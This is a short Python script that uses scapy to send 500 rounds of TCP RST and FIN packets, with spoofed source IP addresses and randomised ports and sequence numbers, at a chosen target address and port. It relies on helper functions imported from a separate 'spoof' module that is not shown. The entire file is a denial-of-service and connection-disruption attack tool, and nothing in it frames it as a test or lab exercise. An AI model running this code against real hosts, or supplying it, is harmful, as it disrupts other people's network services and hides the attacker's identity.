import scapy.all as sc
import os
import sys
from spoof import *

def rst_fin(dst_ip,dst_port):
    for i in range(500):
        pck = sc.IP()
        pck.src = ip_spoof()
        pck.dst = dst_ip
        tcp = sc.TCP()
        tcp.sport,tcp.seq,tcp.window = random_src()
        tcp.dport = dst_port
        tcp.flags = "R"
        sc.send(pck/tcp, verbose=0)
        tcp.flags = "F"
        sc.send(pck/tcp, verbose=0)
